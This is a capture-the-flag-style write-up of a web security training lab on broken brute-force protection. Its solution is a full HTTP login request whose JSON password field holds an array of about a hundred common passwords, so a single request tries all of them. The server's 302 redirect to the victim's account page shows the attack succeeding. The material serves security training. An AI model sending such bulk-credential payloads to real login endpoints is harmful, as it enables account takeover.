# Lab Description

## Lab: Broken brute-force protection, multiple credentials per request

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

Victim's username: carlos

# Lab Solution

**HTTP Request**

```
POST /login HTTP/1.1
Host: 0abd00a704b3783b804b44ac001f00f7.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0abd00a704b3783b804b44ac001f00f7.web-security-academy.net/login
Content-Type: application/json
Origin: https://0abd00a704b3783b804b44ac001f00f7.web-security-academy.net
Connection: keep-alive
Cookie: session=CFJN2Y3ux118fuh6aLqqvHIgzKURff3v
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
DNT: 1
Sec-GPC: 1
Content-Length: 993

{"username" : "carlos", "password" : ["123456", "password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]}

```

**HTTP Response 302 Found Redirect**

```
HTTP/1.1 302 Found
Location: /my-account?id=carlos
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
Set-Cookie: session=G7q9BJS56LxbjznfpeIVPI6qWP1Z1moN; Secure; HttpOnly; SameSite=None


```
